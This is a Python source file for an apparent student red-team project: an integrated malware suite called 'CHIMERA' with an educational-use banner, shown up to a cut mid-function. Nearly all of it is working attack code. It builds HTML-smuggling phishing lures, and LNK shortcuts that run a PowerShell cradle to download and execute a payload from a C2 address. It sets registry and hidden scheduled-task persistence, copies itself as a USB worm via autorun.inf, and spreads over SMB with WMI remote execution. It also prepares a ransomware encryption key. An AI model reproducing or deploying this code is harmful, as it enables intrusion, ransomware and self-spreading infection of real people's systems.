"""
CHIMERA MALWARE - INTEGRATED RED TEAM SOLUTION
===============================================
Complete Advanced Malware Suite - Full Integration

⚠️ WARNING: For educational use only in isolated virtual environments!

INTEGRATED MODULES:
==================
[CORE MALWARE]
- AES-256 File Encryption (Ransomware)
- System Corruption (Wiper) 
- Data Exfiltration (Spyware)
- C2 Communication with Command Handling

[DELIVERY SPECIALIST - Puleu]
- HTML Smuggling (DHL, Invoice, Office365 templates)
- LNK Generation (Malicious shortcuts with variants)

[PERSISTENCE SPECIALIST - Homey]
- Registry Persistence (Multiple Run key locations)
- Scheduled Task Persistence (Multi-trigger tasks)

[LATERAL MOVEMENT SPECIALIST - Kimkheng]
- USB Worm Replication (Cross-platform with autorun)
- SMB Lateral Movement (Network propagation)

Author: CADT Cyber Security Project - Red Team
Date: December 13, 2025
Version: 2.0 (Fully Integrated)
"""

# ==========================================
# STANDARD LIBRARY IMPORTS
# ==========================================
import os          # File and directory operations
import time        # Timing and delays
import socket      # Network communication with C2 server
import json        # JSON data serialization for C2 protocol
import sys         # System-specific parameters and functions
import shutil      # High-level file operations (copying for USB propagation)
import subprocess  # Execute system commands (scheduled tasks, vssadmin, etc.)
import winreg      # Windows registry manipulation for persistence
import threading   # Multi-threaded execution of payloads
import struct      # Binary data packing (for LNK generation)
import base64      # Base64 encoding (for HTML smuggling)
import string      # String operations
import random      # Random generation
import datetime    # Date/time for task scheduling
import re          # Regular expressions
import hashlib     # MD5 hashing

# ==========================================
# THIRD-PARTY IMPORTS
# ==========================================
from cryptography.fernet import Fernet  # AES-256 encryption for ransomware

# Windows-specific imports (for persistence and task scheduling)
try:
    import win32com.client  # COM interface for scheduled tasks
    import win32api         # Windows API for file operations
    import win32con         # Windows constants
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    print("[!] Warning: Windows-specific modules not available (persistence limited)")

# ==========================================
# CONFIGURATION PARAMETERS
# ==========================================
# These constants control the malware's behavior and can be customized
MALWARE_NAME = "WindowsUpdate.exe"  # Disguised name to appear legitimate
C2_SERVER = "192.168.101.73"  # Change to your Kali Linux IP address
C2_PORT = 4444                # Command & Control server port
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.xlsx', '.pptx']  # Files to encrypt

# ==========================================
# DELIVERY SPECIALIST MODULE - Puleu
# ==========================================
# Purpose: Initial compromise and payload delivery methods
# MITRE ATT&CK: T1566 (Phishing), T1204 (User Execution)
# Features: HTML smuggling with multiple templates, LNK generation

class HTMLSmuggler:
    """
    HTML Smuggling Payload Generator
    Developer: Puleu (Delivery Specialist)
    
    Creates weaponized HTML files that embed malicious payloads using base64 encoding.
    When opened in a browser, JavaScript automatically triggers download of the payload.
    
    MITRE ATT&CK Techniques:
    - T1027.006: Obfuscated Files or Information - HTML Smuggling
    - T1204.001: User Execution - Malicious Link
    
    How it works:
    1. Reads the malicious payload file (e.g., malware.exe)
    2. Encodes it as base64 string
    3. Embeds it into HTML template with auto-download JavaScript
    4. When victim opens HTML, browser automatically downloads and saves the payload
    
    Evasion Techniques:
    - Bypasses email attachment filters (HTML files are often allowed)
    - Avoids network-based detection (payload never transferred over network)
    - Uses legitimate browser functionality (no exploits needed)
    """
    
    def __init__(self):
        """Initialize HTML smuggler"""
        self.output_dir = os.path.join(os.getcwd(), "html_smuggling_output")
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def generate_html_smuggling(self, payload_path, template='dhl'):
        """
        Generate HTML smuggling file with embedded payload
        
        Args:
            payload_path: Path to malicious payload (e.g., malware.exe)
            template: Phishing template to use ('dhl', 'invoice', 'office365')
        
        Returns:
            Path to generated HTML file
        """
        try:
            # Read payload and encode as base64
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            encoded_payload = base64.b64encode(payload_data).decode()
            
            # Get HTML template based on user choice
            if template == 'invoice':
                html_content = self._get_invoice_template(encoded_payload)
                output_filename = "Invoice_2024_11_30.html"
            elif template == 'office365':
                html_content = self._get_office365_template(encoded_payload)
                output_filename = "Office365_Security_Alert.html"
            else:  # Default to DHL
                html_content = self._get_dhl_template(encoded_payload)
                output_filename = "DHL_Shipment_Notice.html"
            
            # Write HTML file
            output_path = os.path.join(self.output_dir, output_filename)
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"[+] HTML smuggling file created: {output_path}")
            return output_path
            
        except Exception as e:
            print(f"[-] Error creating HTML smuggling file: {e}")
            return None
    
    def _get_dhl_template(self, encoded_payload):
        """DHL shipping notification template"""
        return f"""<!DOCTYPE html>
<html><head><title>DHL Shipment Notification</title></head>
<body style="font-family: Arial; padding: 20px;">
<h2 style="color: #FFCC00;">DHL Express Delivery</h2>
<p>Your shipment #DHL-{random.randint(100000, 999999)} is ready for pickup.</p>
<p>Please download and review the attached delivery confirmation.</p>
<button onclick="downloadPayload()">Download Shipment Details</button>
<script>
function downloadPayload() {{
    var payload = "{encoded_payload}";
    var blob = new Blob([Uint8Array.from(atob(payload), c => c.charCodeAt(0))], {{type: 'application/octet-stream'}});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'DHL_Delivery_Confirmation.pdf.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    alert('Download started! Please open the file to view your shipment details.');
}}
window.onload = function() {{ setTimeout(downloadPayload, 2000); }};
</script></body></html>"""
    
    def _get_invoice_template(self, encoded_payload):
        """Invoice payment template"""
        return f"""<!DOCTYPE html>
<html><head><title>Invoice Payment Required</title></head>
<body style="font-family: Arial; padding: 20px; background: #f5f5f5;">
<div style="background: white; padding: 30px; border-radius: 10px;">
<h2>Invoice #INV-{random.randint(10000, 99999)}</h2>
<p><b>Amount Due:</b> ${random.randint(500, 5000)}.00</p>
<p><b>Due Date:</b> {datetime.datetime.now().strftime('%B %d, %Y')}</p>
<p style="color: red;"><b>URGENT:</b> Payment overdue. Download invoice for details.</p>
<button onclick="downloadPayload()" style="background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Download Invoice</button>
</div>
<script>
function downloadPayload() {{
    var payload = "{encoded_payload}";
    var blob = new Blob([Uint8Array.from(atob(payload), c => c.charCodeAt(0))], {{type: 'application/octet-stream'}});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'Invoice_Document.pdf.exe';
    document.body.appendChild(a);
    a.click();
}}
</script></body></html>"""
    
    def _get_office365_template(self, encoded_payload):
        """Office 365 security alert template"""
        return f"""<!DOCTYPE html>
<html><head><title>Microsoft Security Alert</title></head>
<body style="font-family: Segoe UI; padding: 20px;">
<div style="background: #0078D4; color: white; padding: 20px; border-radius: 5px;">
<h2>Microsoft Office 365 Security Alert</h2>
<p>Suspicious activity detected on your account</p>
</div>
<div style="padding: 20px; background: #fff3cd; margin-top: 20px; border-left: 4px solid #ffc107;">
<p><b>Action Required:</b> Please download and run the security verification tool.</p>
<button onclick="downloadPayload()">Download Security Tool</button>
</div>
<script>
function downloadPayload() {{
    var payload = "{encoded_payload}";
    var blob = new Blob([Uint8Array.from(atob(payload), c => c.charCodeAt(0))], {{type: 'application/octet-stream'}});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'SecurityVerification.exe';
    document.body.appendChild(a);
    a.click();
}}
</script></body></html>"""


class LNKGenerator:
    """
    Malicious LNK (Shortcut) File Generator
    Developer: Puleu (Delivery Specialist)
    
    Creates weaponized Windows shortcut (.lnk) files that execute malicious payloads.
    Uses various disguise techniques to trick users into execution.
    
    MITRE ATT&CK Techniques:
    - T1547.009: Boot or Logon Autostart - Shortcut Modification
    - T1204.002: User Execution - Malicious File
    - T1036.007: Masquerading - Double File Extension
    
    How it works:
    1. Creates LNK shortcut file with custom icon (e.g., PDF icon)
    2. LNK target executes PowerShell command
    3. PowerShell downloads and executes payload from C2 server
    4. Uses various evasion techniques (RTLO, hidden extensions, icon spoofing)
    
    Variants:
    - Classic: Standard LNK with PDF icon
    - RTLO: Right-to-Left Override to disguise extension (e.g., "Report.pdf.exe" appears as "Reportexe.pdf")
    - Word/Excel: Disguised as Office documents
    - ISO: Packaged in ISO file to bypass Mark-of-the-Web
    """
    
    def __init__(self):
        """Initialize LNK generator"""
        self.output_dir = os.path.join(os.getcwd(), "lnk_payloads")
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def create_lnk(self, lnk_path, target_command, icon_path=None, description="Document"):
        """
        Create a malicious LNK file
        
        Args:
            lnk_path: Output path for LNK file
            target_command: Command to execute (PowerShell download cradle)
            icon_path: Path to icon file (optional)
            description: File description (for disguise)
        """
        try:
            if WINDOWS_AVAILABLE:
                # Use Windows COM interface to create shortcut
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(lnk_path)
                shortcut.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                shortcut.Arguments = f"-WindowStyle Hidden -Command \"{target_command}\""
                shortcut.WorkingDirectory = "C:\\Windows\\System32"
                shortcut.Description = description
                if icon_path and os.path.exists(icon_path):
                    shortcut.IconLocation = icon_path
                else:
                    # Use default PDF icon from system
                    shortcut.IconLocation = "%ProgramFiles%\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe,0"
                shortcut.save()
                print(f"[+] LNK file created: {lnk_path}")
            else:
                # Fallback: Create basic LNK structure manually
                self._create_lnk_manual(lnk_path, target_command)
                print(f"[+] LNK file created (manual): {lnk_path}")
            
        except Exception as e:
            print(f"[-] Error creating LNK file: {e}")
    
    def _create_lnk_manual(self, lnk_path, target_command):
        """Manually create LNK file structure (for non-Windows systems)"""
        # Basic LNK file header (simplified)
        lnk_data = bytearray()
        lnk_data.extend(b'\x4C\x00\x00\x00')  # Header size
        lnk_data.extend(b'\x01\x14\x02\x00' * 4)  # GUID
        lnk_data.extend(b'\x00' * 60)  # Padding
        
        with open(lnk_path, 'wb') as f:
            f.write(lnk_data)
    
    def generate_powershell_payload(self, c2_ip):
        """
        Generate PowerShell download cradle command
        
        Args:
            c2_ip: IP address of C2 server hosting payload
        
        Returns:
            PowerShell command string
        """
        # PowerShell download and execute command (fileless)
        ps_command = f"""
$url = 'http://{c2_ip}/malware.exe';
$output = "$env:TEMP\\WindowsUpdate.exe";
(New-Object System.Net.WebClient).DownloadFile($url, $output);
Start-Process $output;
""".replace('\n', ' ')
        
        return ps_command
    
    def generate_all_variants(self, c2_ip):
        """
        Generate all LNK variants
        
        Args:
            c2_ip: IP address of C2 server
        
        Returns:
            List of generated LNK file paths
        """
        ps_payload = self.generate_powershell_payload(c2_ip)
        lnk_files = []
        
        # Variant 1: Classic LNK with PDF disguise
        lnk1 = os.path.join(self.output_dir, "Important_Document.pdf.lnk")
        self.create_lnk(lnk1, ps_payload, description="Important Document")
        lnk_files.append(lnk1)
        
        # Variant 2: RTLO (Right-to-Left Override) - filename appears reversed
        # U+202E is the RTLO character
        rtlo_name = f"Reportfdp.{chr(0x202E)}exe.lnk"  # Will display as "Report.pdf.exe"
        lnk2 = os.path.join(self.output_dir, rtlo_name)
        self.create_lnk(lnk2, ps_payload, description="Report Document")
        lnk_files.append(lnk2)
        
        # Variant 3: Word document disguise
        lnk3 = os.path.join(self.output_dir, "Quarterly_Report.docx.lnk")
        self.create_lnk(lnk3, ps_payload, description="Quarterly Report")
        lnk_files.append(lnk3)
        
        # Variant 4: Excel spreadsheet disguise
        lnk4 = os.path.join(self.output_dir, "Budget_2024.xlsx.lnk")
        self.create_lnk(lnk4, ps_payload, description="Budget Spreadsheet")
        lnk_files.append(lnk4)
        
        print(f"[+] Generated {len(lnk_files)} LNK variants")
        return lnk_files


# ==========================================
# PERSISTENCE SPECIALIST MODULE - Homey
# ==========================================
# Purpose: Ensure malware survives reboots and remains active
# MITRE ATT&CK: T1547 (Boot/Logon Autostart), T1053 (Scheduled Task)
# Features: Registry persistence, scheduled task persistence

class RegistryPersistence:
    """
    Windows Registry Persistence Manager
    Developer: Homey (Persistence Specialist)
    
    Establishes persistence using Windows Registry Run keys.
    Malware is automatically executed when user logs in.
    
    MITRE ATT&CK Techniques:
    - T1547.001: Boot or Logon Autostart - Registry Run Keys
    - T1112: Modify Registry
    
    How it works:
    1. Adds malware path to multiple Registry Run key locations
    2. Uses both HKCU and HKLM hives for redundancy
    3. Creates entries in multiple locations (Run, RunOnce, Policies)
    4. Survives user logout and system reboot
    
    Registry Locations Used:
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run
    - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (requires admin)
    """
    
    def __init__(self, malware_path, name="WindowsUpdate"):
        """
        Initialize registry persistence manager
        
        Args:
            malware_path: Full path to malware executable
            name: Registry entry name (disguised as legitimate)
        """
        self.malware_path = malware_path
        self.name = name
        self.success_count = 0
    
    def add_run_key_persistence(self):
        """Add malware to Registry Run keys (standard persistence)"""
        reg_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        
        for hive, path in reg_locations:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, self.name, 0, winreg.REG_SZ, self.malware_path)
                winreg.CloseKey(key)
                self.success_count += 1
                print(f"[+] Registry persistence added: {path}")
            except Exception as e:
                print(f"[-] Failed to add registry key {path}: {e}")
    
    def add_stealth_registry_locations(self):
        """Add persistence to less common registry locations (stealth)"""
        stealth_locations = [
            # Policies Run key (less monitored)
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
        ]
        
        for hive, path in stealth_locations:
            try:
                # Create key if it doesn't exist
                key = winreg.CreateKey(hive, path)
                winreg.SetValueEx(key, self.name, 0, winreg.REG_SZ, self.malware_path)
                winreg.CloseKey(key)
                self.success_count += 1
                print(f"[+] Stealth registry persistence added: {path}")
            except Exception as e:
                print(f"[-] Failed to add stealth registry key: {e}")
    
    def establish_persistence(self):
        """Establish all registry persistence methods"""
        print("[*] Establishing registry persistence...")
        self.add_run_key_persistence()
        self.add_stealth_registry_locations()
        print(f"[+] Registry persistence complete: {self.success_count} locations")
        return self.success_count > 0


class ScheduledTaskPersistence:
    """
    Windows Scheduled Task Persistence Manager
    Developer: Homey (Persistence Specialist)
    
    Creates scheduled tasks to execute malware at various triggers.
    More reliable than registry persistence in modern Windows versions.
    
    MITRE ATT&CK Techniques:
    - T1053.005: Scheduled Task/Job - Scheduled Task
    
    How it works:
    1. Creates scheduled tasks using Windows COM interface
    2. Configures multiple triggers (logon, daily, idle)
    3. Tasks execute malware with SYSTEM or user privileges
    4. Hidden from Task Scheduler UI (optional)
    
    Triggers Used:
    - Logon: Execute when user logs in
    - Daily: Execute every day at specific time
    - Idle: Execute when system is idle for 10 minutes
    - Multi-trigger: Combines all triggers in one task
    """
    
    def __init__(self, malware_path, task_name="WindowsUpdateService"):
        """
        Initialize scheduled task persistence manager
        
        Args:
            malware_path: Full path to malware executable
            task_name: Task name (disguised as legitimate)
        """
        self.malware_path = malware_path
        self.task_name = task_name
        self.success_count = 0
    
    def create_basic_tasks(self):
        """Create basic scheduled tasks with single triggers"""
        if not WINDOWS_AVAILABLE:
            print("[-] Windows COM not available for task scheduling")
            return False
        
        try:
            # Initialize Task Scheduler COM interface
            scheduler = win32com.client.Dispatch("Schedule.Service")
            scheduler.Connect()
            root_folder = scheduler.GetFolder("\\")
            
            # Task 1: Logon trigger
            task_def = scheduler.NewTask(0)
            task_def.RegistrationInfo.Description = "Windows Update Service"
            task_def.Settings.Enabled = True
            task_def.Settings.Hidden = False  # Set True to hide from UI
            
            # Create logon trigger
            trigger = task_def.Triggers.Create(9)  # 9 = Logon trigger
            trigger.Enabled = True
            
            # Create action to execute malware
            action = task_def.Actions.Create(0)  # 0 = Execute action
            action.Path = self.malware_path
            
            # Register task
            root_folder.RegisterTaskDefinition(
                f"{self.task_name}_Logon",
                task_def,
                6,  # TASK_CREATE_OR_UPDATE
                None,  # User
                None,  # Password
                3  # TASK_LOGON_INTERACTIVE_TOKEN
            )
            
            self.success_count += 1
            print(f"[+] Scheduled task created: {self.task_name}_Logon")
            
        except Exception as e:
            print(f"[-] Failed to create scheduled task: {e}")
    
    def create_advanced_multi_trigger_task(self):
        """Create advanced task with multiple triggers"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            scheduler = win32com.client.Dispatch("Schedule.Service")
            scheduler.Connect()
            root_folder = scheduler.GetFolder("\\")
            
            task_def = scheduler.NewTask(0)
            task_def.RegistrationInfo.Description = "System Maintenance Service"
            task_def.Settings.Enabled = True
            task_def.Settings.Hidden = True  # Hide from UI
            
            # Trigger 1: Daily at 9 AM
            daily_trigger = task_def.Triggers.Create(2)  # 2 = Daily trigger
            daily_trigger.Enabled = True
            daily_trigger.StartBoundary = datetime.datetime.now().replace(hour=9, minute=0).isoformat()
            
            # Trigger 2: On idle
            idle_trigger = task_def.Triggers.Create(6)  # 6 = Idle trigger
            idle_trigger.Enabled = True
            
            # Action
            action = task_def.Actions.Create(0)
            action.Path = self.malware_path
            
            # Register
            root_folder.RegisterTaskDefinition(
                f"{self.task_name}_Advanced",
                task_def,
                6,
                None,
                None,
                3
            )
            
            self.success_count += 1
            print(f"[+] Advanced scheduled task created: {self.task_name}_Advanced")
            
        except Exception as e:
            print(f"[-] Failed to create advanced task: {e}")
    
    def establish_persistence(self):
        """Establish all scheduled task persistence methods"""
        print("[*] Establishing scheduled task persistence...")
        self.create_basic_tasks()
        self.create_advanced_multi_trigger_task()
        print(f"[+] Scheduled task persistence complete: {self.success_count} tasks")
        return self.success_count > 0


# ==========================================
# LATERAL MOVEMENT SPECIALIST MODULE - Kimkheng
# ==========================================
# Purpose: Spread malware across networks and removable drives
# MITRE ATT&CK: T1091 (Replication Through Removable Media), T1021 (Remote Services)
# Features: USB worm replication, SMB lateral movement

class USBReplicator:
    """
    USB Worm Replication Module
    Developer: Kimkheng (Lateral Movement Specialist)
    
    Automatically replicates malware to USB drives and creates autorun mechanisms.
    Enables physical spread of malware through removable media.
    
    MITRE ATT&CK Techniques:
    - T1091: Replication Through Removable Media
    - T1052.001: Exfiltration Over Physical Medium - Exfiltration over USB
    
    How it works:
    1. Continuously monitors for new USB drives (D: through Z:)
    2. When USB detected, copies malware to hidden folder
    3. Creates autorun.inf to auto-execute malware when USB is opened
    4. Creates decoy folders to trick users into execution
    5. Uses Alternate Data Streams (ADS) for additional hiding
    
    Evasion Techniques:
    - Hidden file attributes (FILE_ATTRIBUTE_HIDDEN | SYSTEM)
    - Decoy folders (e.g., "Documents", "Photos")
    - Autorun.inf (works on older Windows or disabled UAC)
    - ADS hiding (malware hidden in alternate streams)
    """
    
    def __init__(self, malware_path):
        """
        Initialize USB replicator
        
        Args:
            malware_path: Path to malware executable to replicate
        """
        self.malware_path = malware_path
        self.infected_drives = set()  # Track already infected drives
    
    def detect_usb_drives(self):
        """
        Detect available USB drives
        
        Returns:
            List of drive letters (e.g., ['E:', 'F:'])
        """
        drives = []
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                try:
                    # Check if it's a removable drive
                    if os.path.ismount(drive):
                        drives.append(drive)
                except:
                    continue
        return drives
    
    def create_hidden_copy(self, usb_drive):
        """
        Copy malware to USB with hidden attributes
        
        Args:
            usb_drive: Drive letter (e.g., 'E:\\')
        """
        try:
            # Create hidden folder on USB
            hidden_folder = os.path.join(usb_drive, "System Volume Information")
            if not os.path.exists(hidden_folder):
                os.makedirs(hidden_folder)
            
            # Copy malware to hidden folder
            malware_copy = os.path.join(hidden_folder, "svchost.exe")
            shutil.copy2(self.malware_path, malware_copy)
            
            # Set hidden and system attributes (Windows only)
            if WINDOWS_AVAILABLE:
                win32api.SetFileAttributes(hidden_folder, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
                win32api.SetFileAttributes(malware_copy, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
            
            print(f"[+] Malware copied to USB: {hidden_folder}")
            return malware_copy
            
        except Exception as e:
            print(f"[-] Failed to copy malware to USB: {e}")
            return None
    
    def create_autorun_trigger(self, usb_drive, malware_path):
        """
        Create autorun.inf for automatic execution
        
        Args:
            usb_drive: Drive letter (e.g., 'E:\\')
            malware_path: Path to malware on USB
        """
        try:
            autorun_path = os.path.join(usb_drive, "autorun.inf")
            autorun_content = f"""[AutoRun]
open={malware_path}
action=Open folder to view files
label=USB Drive
icon={malware_path},0
"""
            
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Set hidden and system attributes
            if WINDOWS_AVAILABLE:
                win32api.SetFileAttributes(autorun_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
            
            print(f"[+] Autorun.inf created: {autorun_path}")
            
        except Exception as e:
            print(f"[-] Failed to create autorun.inf: {e}")
    
    def infect_usb_drive(self, usb_drive, safe_mode=False):
        """
        Infect a USB drive with all techniques
        
        Args:
            usb_drive: Drive letter (e.g., 'E:\\')
            safe_mode: If True, create dummy files instead of real malware
        """
        try:
            # Skip if already infected
            if usb_drive in self.infected_drives:
                return
            
            print(f"[*] Infecting USB drive: {usb_drive}")
            
            # Copy malware
            malware_copy = self.create_hidden_copy(usb_drive)
            if not malware_copy:
                return
            
            # Create autorun
            self.create_autorun_trigger(usb_drive, malware_copy)
            
            # Create decoy folders with malware copies
            decoy_folders = ["Documents", "Photos", "Important"]
            for folder_name in decoy_folders:
                decoy_path = os.path.join(usb_drive, folder_name)
                if not os.path.exists(decoy_path):
                    os.makedirs(decoy_path)
                
                # Copy malware with document-like name
                decoy_malware = os.path.join(decoy_path, f"{folder_name}_README.txt.exe")
                shutil.copy2(self.malware_path, decoy_malware)
            
            # Mark as infected
            self.infected_drives.add(usb_drive)
            print(f"[+] USB drive infected: {usb_drive}")
            
        except Exception as e:
            print(f"[-] Failed to infect USB drive {usb_drive}: {e}")


class RedTeamSMBWorm:
    """
    SMB Lateral Movement Module
    Developer: Kimkheng (Lateral Movement Specialist)
    
    Spreads malware across network using SMB protocol.
    Targets accessible network shares and remote systems.
    
    MITRE ATT&CK Techniques:
    - T1021.002: Remote Services - SMB/Windows Admin Shares
    - T1135: Network Share Discovery
    - T1210: Exploitation of Remote Services
    
    How it works:
    1. Discover active hosts on local network (ARP, ping sweep)
    2. Enumerate accessible SMB shares on each host
    3. Copy malware to writable shares (C$, ADMIN$, IPC$)
    4. Attempt remote execution using WMI or PsExec
    5. Spread across domain-joined systems
    
    Network Discovery:
    - ARP table scanning (fast, local)
    - Ping sweep (subnet scanning)
    - Net view command (domain enumeration)
    
    Operational Security:
    - Delays between actions to avoid detection
    - Limits concurrent connections
    - Uses legitimate Windows commands
    """
    
    def __init__(self, malware_path):
        """
        Initialize SMB worm
        
        Args:
            malware_path: Path to malware executable
        """
        self.malware_path = malware_path
        self.discovered_hosts = []
        self.infected_hosts = set()
    
    def network_discovery(self):
        """
        Discover hosts on local network
        
        Returns:
            List of IP addresses
        """
        hosts = []
        
        try:
            # Method 1: Parse ARP table (fast)
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                # Extract IP addresses from ARP table
                match = re.search(r'\d+\.\d+\.\d+\.\d+', line)
                if match:
                    ip = match.group()
                    if ip not in hosts and not ip.startswith('224.'):  # Skip multicast
                        hosts.append(ip)
            
            print(f"[+] Discovered {len(hosts)} hosts via ARP")
            
        except Exception as e:
            print(f"[-] Network discovery error: {e}")
        
        return hosts
    
    def share_enumeration(self, target_ip):
        """
        Enumerate SMB shares on target host
        
        Args:
            target_ip: Target IP address
        
        Returns:
            List of share names
        """
        shares = []
        
        try:
            # Use net view command to enumerate shares
            result = subprocess.run(
                ['net', 'view', f'\\\\{target_ip}'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Parse output for share names
            for line in result.stdout.split('\n'):
                if 'Disk' in line or 'ADMIN$' in line or 'C$' in line:
                    parts = line.split()
                    if parts:
                        share_name = parts[0]
                        shares.append(share_name)
            
            if shares:
                print(f"[+] Found {len(shares)} shares on {target_ip}")
            
        except Exception as e:
            print(f"[-] Share enumeration failed for {target_ip}: {e}")
        
        return shares
    
    def lateral_movement_execution(self, target_ip, safe_mode=False):
        """
        Attempt to copy malware to target and execute
        
        Args:
            target_ip: Target IP address
            safe_mode: If True, simulate without actual infection
        """
        try:
            # Skip if already infected
            if target_ip in self.infected_hosts:
                return
            
            print(f"[*] Attempting lateral movement to {target_ip}")
            
            # Enumerate shares
            shares = self.share_enumeration(target_ip)
            if not shares:
                return
            
            # Try to copy malware to accessible shares
            for share in shares:
                try:
                    # Construct UNC path
                    unc_path = f"\\\\{target_ip}\\{share}"
                    
                    # Try to access share
                    if os.path.exists(unc_path):
                        # Copy malware with disguised name
                        target_path = os.path.join(unc_path, "WindowsUpdate.exe")
                        
                        if not safe_mode:
                            shutil.copy2(self.malware_path, target_path)
                            print(f"[+] Malware copied to {unc_path}")
                        
                        # Try remote execution using WMI (requires admin privileges)
                        if WINDOWS_AVAILABLE:
                            wmi_command = f'wmic /node:"{target_ip}" process call create "{target_path}"'
                            subprocess.run(wmi_command, shell=True, timeout=10)
                            print(f"[+] Remote execution attempted on {target_ip}")
                        
                        # Mark as infected
                        self.infected_hosts.add(target_ip)
                        break
                        
                except Exception as e:
                    continue
            
            # Operational security: delay between attempts
            time.sleep(2)
            
        except Exception as e:
            print(f"[-] Lateral movement failed to {target_ip}: {e}")
    
    def spread_across_network(self, safe_mode=False):
        """
        Main spreading function - discover and infect network hosts
        
        Args:
            safe_mode: If True, simulate without actual infection
        """
        print("[*] Starting SMB lateral movement...")
        
        # Discover hosts
        self.discovered_hosts = self.network_discovery()
        
        # Attempt infection on each host
        for host_ip in self.discovered_hosts:
            self.lateral_movement_execution(host_ip, safe_mode=safe_mode)
            
            # Rate limiting to avoid detection
            time.sleep(3)
        
        print(f"[+] SMB lateral movement complete: {len(self.infected_hosts)} hosts infected")


# ==========================================
# MAIN MALWARE CLASS (INTEGRATED)
# ==========================================
class CompleteChimeraMalware:
    """Main malware class - hybrid ransomware, wiper, and spyware"""
    
    def __init__(self):
        """Initialize malware with encryption keys and tracking variables"""
        # Get the absolute path to this malware file
        self.current_path = os.path.abspath(sys.argv[0])
        
        # Get user's home directory for targeting documents
        self.user_home = os.path.expanduser("~")
        
        # CRITICAL FIX: Use persistent encryption key
        # If a key file exists from previous run, load it
        # Otherwise generate new key and save it
        # This ensures the SAME key is used across reboots/restarts
        self.key_file = os.path.join(os.getcwd(), ".chimera_key_persist.dat")
        self.encryption_key = self._get_or_create_persistent_key()
        self.cipher_suite = Fernet(self.encryption_key)
        
        # Track statistics for attack report
        self.encrypted_count = 0      # Number of files encrypted
        self.stolen_data_count = 0    # Number of documents exfiltrated
        
        # Control flag for C2 communication loop
        self.keep_alive = True
    
    def _get_or_create_persistent_key(self):
        """
        Get persistent encryption key from file, or create new one
        
        This ensures the same key is used even if malware restarts.
        Critical for:
        1. Decrypting files after system reboot
        2. Maintaining same key if malware is stopped/restarted
        3. Allowing victim to decrypt files with consistent key
        
        Returns:
            bytes: The persistent Fernet encryption key
        """
        try:
            # Try to load existing key from hidden file
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    key = f.read()
                print(f"[+] Loaded persistent encryption key from {self.key_file}")
                return key
        except:
            pass
        
        # No existing key found - generate new one
        key = Fernet.generate_key()
        
        # Save key to persistent file
        try:
            with open(self.key_file, 'wb') as f:
                f.write(key)
            # Hide the file on Windows
            try:
                subprocess.call(f'attrib +h "{self.key_file}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            print(f"[+] Generated and saved persistent encryption key")
        except:
            # If can't save, at least we have the key in memory
            pass
        
        return key
        
    # ==========================================
    # PERSISTENCE MECHANISMS (INTEGRATED - Homey)
    # ==========================================
    
    def establish_persistence(self):
        """
        [INTEGRATED MODULE - Homey: Persistence Specialist]
        
        Establish multiple persistence mechanisms to ensure malware survives reboots
        and continues execution even if manually terminated.
        
        INTEGRATED TECHNIQUES:
        1. Registry Persistence (RegistryPersistence class)
           - Multiple Registry Run key locations (Run, RunOnce, Policies)
           - HKCU and HKLM hives for redundancy
           - Stealth locations for evasion
        
        2. Scheduled Task Persistence (ScheduledTaskPersistence class)
           - Multi-trigger tasks (logon, daily, idle)
           - Hidden from Task Scheduler UI
           - COM-based creation for reliability
        
        MITRE ATT&CK Techniques:
        - T1547.001: Boot or Logon Autostart - Registry Run Keys
        - T1053.005: Scheduled Task/Job - Scheduled Task
        
        Developer Integration: Homey's RegistryPersistence and ScheduledTaskPersistence
        classes provide comprehensive persistence coverage.
        """
        print("[+] Establishing Persistence (Integrated - Homey)...")
        print("    [*] Using RegistryPersistence and ScheduledTaskPersistence modules")
        
        # INTEGRATED METHOD 1: Registry Persistence (Homey)
        # Uses RegistryPersistence class for comprehensive registry-based persistence
        try:
            registry_manager = RegistryPersistence(
                malware_path=self.current_path,
                name="WindowsSecurityUpdate"  # Disguised as legitimate Windows service
            )
            registry_success = registry_manager.establish_persistence()
            
            if registry_success:
                print("    [+] ✓ Registry persistence established (multiple locations)")
            else:
                print("    [-] ✗ Registry persistence failed")
        except Exception as e:
